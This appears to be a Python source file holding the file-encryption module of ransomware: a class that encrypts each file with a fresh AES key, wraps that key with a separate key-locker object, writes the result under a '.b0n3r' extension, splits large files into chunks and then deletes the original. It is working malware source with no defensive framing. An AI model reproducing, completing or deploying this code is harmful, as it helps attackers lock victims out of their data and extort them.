from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Util.Padding import pad
from getfiles import deleteFile, getFilesize

class FileLocker():

    def __init__(self, file_path):
        self.chunk_size = 1024*1024*32
        self.extension = ".b0n3r"
        self.file_path=file_path
    def cipher(self):
        key = Random.new().read(16)
        self.key = key
        iv = Random.new().read(16)
        self.iv = iv
        return AES.new(self.key, AES.MODE_CBC, self.iv)

    def delete(self):
        deleteFile(self.file_path)

    def encrypt_key(self,cl_key,s_key):
        c=self.cipher()
        with open(self.file_path+self.extension, "wb") as fk:
            fk.write(c.encrypt(pad(cl_key.key.export_key(),16))+self.iv+s_key.encrypt(self.key))

    def encrypt(self,keylocker):
        if getFilesize(self.file_path) <= self.chunk_size:
            c=self.cipher()

            try:
                with open(self.file_path, "rb") as fxs:
                    with open(self.file_path + self.extension, "wb") as fbone:
                        fbone.write(c.encrypt(pad(fxs.read(), 16))+self.iv+keylocker.encrypt(self.key))

                print("Done encrypting:" + self.file_path)
            except Exception as e:
                print("Error reading file: "+self.file_path)
                print(e)
            else:
                try:
                    self.delete()
                except Exception as e:
                    print(e)

        else:

            try:
                with open(self.file_path,"rb") as fxl:
                    file_counter=0
                    while True:
                        c=self.cipher()
                        content = fxl.read(self.chunk_size)
                        if len(content) == 0:
                            break
                        else:
                            with open(self.file_path+self.extension+str(file_counter), "wb") as fbone:
                                fbone.write(c.encrypt(pad(content, 16))+self.iv+keylocker.encrypt(self.key))
                            file_counter = file_counter+1

                print("Done encrypting:" + self.file_path)
            except Exception as e:
                print("Error reading file: "+self.file_path)
                print(e)
            else:
                try:
                    self.delete()
                except Exception as e:
                    print(e)


